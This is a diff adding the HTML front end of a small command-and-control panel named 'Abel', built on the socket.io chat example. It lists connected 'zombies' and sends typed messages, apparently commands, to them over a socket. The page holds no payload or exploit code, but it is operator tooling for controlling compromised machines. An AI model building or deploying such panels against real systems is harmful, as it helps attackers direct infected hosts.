@@ -1,0 +1,111 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Abel Command & Control</title>
+
+    <!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    <style>
+      * { margin-right: 120; padding: 30; box-sizing: border-box; }
+      body { font: 13px Helvetica, Arial; }
+      
+      form { background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; }
+      form input { border: 0; padding: 10px; width: 90%; margin-right: .5%; }
+      form button { width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; }
+      #messages { list-style-type: none; width:1000px; }
+      #messages li { padding: 5px 10px;  width:1000px; }
+      #messages li:nth-child(odd) { background: #eee; width:1000px;}
+      #zombies { list-style-type: none; padding: 0; }
+      #zombies li { padding: 5px 10px;}
+      #zombies li:nth-child(odd) { background: #eee;}
+
+      .panel-heading{
+
+
+        float:right;
+        width:300px;    
+      position: center;
+      }
+      .panel-default {
+	margin-top: 20px;
+      float:right;
+      height:600px;
+      width: 310px;
+      overflow-y: scroll;
+      position:right;
+
+}
+	.panel-body {
+	margin-top:15px
+}
+
+.command-body{
+height:800px;
+width:1300px;
+overflow-y: scroll;
+
+padding:30px;
+box-sizing: border-box;
+}      
+
+
+      
+
+    </style>
+
+
+
+
+  </head>
+  <body>
+  <div class="panel panel-default">
+  <div class="panel-heading">Zombies</div>
+  <div class="panel-body">
+<p>
+ <ul id="zombies"></ul>
+  </div>
+</div>
+
+
+  <body>
+
+  
+  <div class="command-body">
+ <ul id="messages"></ul>
+ </div>
+
+
+
+
+    <form action="">
+      <input id="m" autocomplete="off" /><button>Send</button>
+    </form>
+
+
+
+    <script src="https://cdn.socket.io/socket.io-1.2.0.js"></script>
+    <script src="http://code.jquery.com/jquery-1.11.1.js"></script>
+    
+
+
+    <script>
+      var socket = io();
+      $('form').submit(function(){
+        socket.emit('chat message', $('#m').val());
+        $('#m').val('');
+        return false;
+      });
+      socket.on('chat message', function(msg){
+        $('#messages').append($('<li>').text(msg));
+      });
+
+      socket.on('zombiename', function(msg){
+        $('#zombies').append($('<li>').text(msg));
+      });
+
+
+    </script>
+  </body>
+</html>
+
